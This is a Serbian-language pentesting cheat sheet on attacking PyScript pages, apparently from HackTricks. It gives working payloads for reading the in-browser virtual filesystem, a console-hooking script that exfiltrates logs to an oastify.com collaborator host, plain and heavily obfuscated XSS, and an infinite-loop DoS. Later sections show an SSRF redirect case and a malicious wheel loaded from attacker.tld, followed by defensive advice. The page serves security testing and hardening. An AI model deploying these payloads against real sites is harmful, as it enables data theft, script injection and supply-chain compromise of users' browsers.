# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Vodič za PyScript pentesting

PyScript je novi framework razvijen za integraciju Python-a u HTML, tako da može da se koristi zajedno sa HTML-om. U ovom cheat sheet-u pronaći ćete kako da koristite PyScript za potrebe pentestinga.

### Izbacivanje / preuzimanje datoteka iz Emscripten virtuelnog memorijskog sistema datoteka:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Kod:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Rezultat:

![PyScript Pentesting Guide - Dumping / Retrieving files from the Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (praćenje konzole)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Kod:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Rezultat:

![Dumping / Preuzimanje datoteka iz Emscripten virtualnog memorijskog sistema - OOB Data Exfiltration Emscripten virtualnog memorijskog sistema (praćenje konzole): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Obični)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Rezultat:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (praćenje konzole) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Kod:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Rezultat:

![Cross Site Scripting (Obični) - Cross Site Scripting (Python Obfuskacija): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuskacija)

Kod:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Rezultat:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS napad (beskonačna petlja)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS napad (beskonačna petlja)

Kod:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Rezultat:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nove ranjivosti i tehnike (2023–2025)

### Server-Side Request Forgery putem nekontrolisanih preusmeravanja (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignoriše parametre zahteva `redirect` i `retries` kada se koristi sa Pyodide browser transportom. Ako napadač može da utiče na ciljne URL-ove, kod može pratiti cross-domain preusmeravanja čak i kada se od urllib3 zahteva da ih onemogući, čime se potkopavaju SSRF zaštite.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Nadogradite na `urllib3 >= 2.5.0` za Node.js, ali nemojte se oslanjati na urllib3 da onemogući redirects u browserima; umesto toga, proverite odredišta ili koristite allow-list pre slanja zahteva.<sup>[[4]](#references)</sup>

### Proizvoljno učitavanje paketa i supply-chain napadi

PyScript-ova Pyodide konfiguracija prihvata proizvoljne wheel URL-ove u `packages`; ako napadač može da izmeni ili ubaci tu konfiguraciju, naknadni import može izvršiti Python kod pod kontrolom napadača u browseru žrtve.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide može da instalira pure-Python wheels sa proizvoljnih URL-ova bez WebAssembly build-a paketa.<sup>[[6]](#references)</sup> Ovu konfiguraciju treba da kontroliše developer, dozvoliti samo tačne nazive paketa ili URL-ove sa allow liste i verifikovati remote wheel digest-e tokom build-a ili deployment-a.

### Promene sanitizacije output-a (2023+)

* U implementaciji 2022.05.1 koju koriste legacy primeri, `print()` upisuje `text/plain` output bez HTML escaping-a i zbog toga je podložan XSS-u.<sup>[[8]](#references)</sup>
* Trenutni `display()` helper po default-u **escape-uje HTML** za obične stringove; raw markup mora biti obavijen pomoću `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Koristite `display()` za nepouzdan unos i ne prosleđujte nepouzdane stringove funkciji `HTML()`.<sup>[[2]](#references)</sup>

---

## Najbolje prakse za odbranu

* **Održavajte pakete ažurnim** – koristite `urllib3 >= 2.5.0` u Node.js-u i zasebno pregledajte pretpostavke o preusmeravanju browsera.<sup>[[4]](#references)</sup>
* **Ograničite izvore paketa** – dozvolite samo navedena PyPI imena ili precizne pouzdane URL-ove i proverite digest-e udaljenih wheel-ova tokom build-a ili deployment-a.<sup>[[5]](#references)[[6]](#references)</sup>
* **Ojačajte Content Security Policy** – onemogućite inline JavaScript (`script-src 'self' 'sha256-…'`) kako ubačeni `<script>` blokovi ne bi mogli da se izvrše.
* **Onemogućite korisničke `<py-script>` / `<script type="py">` tagove** – sanitizujte HTML na serveru pre nego što ga vratite drugim korisnicima.
* **Izolujte workere** – ako vam nije potreban sinhroni pristup DOM-u iz workera, omogućite zastavicu `sync_main_only` kako biste izbegli `SharedArrayBuffer` i zahteve za CORS header-ima koji su s njim povezani.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Dokumentacija ugrađenih funkcija PyScript-a – `display` i `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Umetnost ulančavanja ranjivosti (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Bezbednosno upozorenje urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Dokumentacija konfiguracije PyScript-a – paketi i `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Učitavanje paketa](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Implementacija `pyscript.py` u PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
